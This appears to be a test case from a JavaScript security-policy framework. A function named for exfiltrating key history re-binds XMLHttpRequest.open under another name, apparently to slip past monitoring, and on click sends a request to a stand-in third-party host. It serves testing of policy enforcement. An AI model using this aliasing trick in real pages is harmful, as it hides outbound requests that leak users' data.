// exfil_test_clone2.js
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v0 = xmlhttp;
  var v2 = xmlhttp.open;
  var v3 = JAM.call(v2.bind, v2, [xmlhttp], JAM.policy.p15);
  v0.opennew = v3;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true], JAM.policy.p13);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p14);
  return
}
JAM.set(JAM.call(document.getElementById, document, ["test"], JAM.policy.p13), "onclick", exfiltrate_key_history)
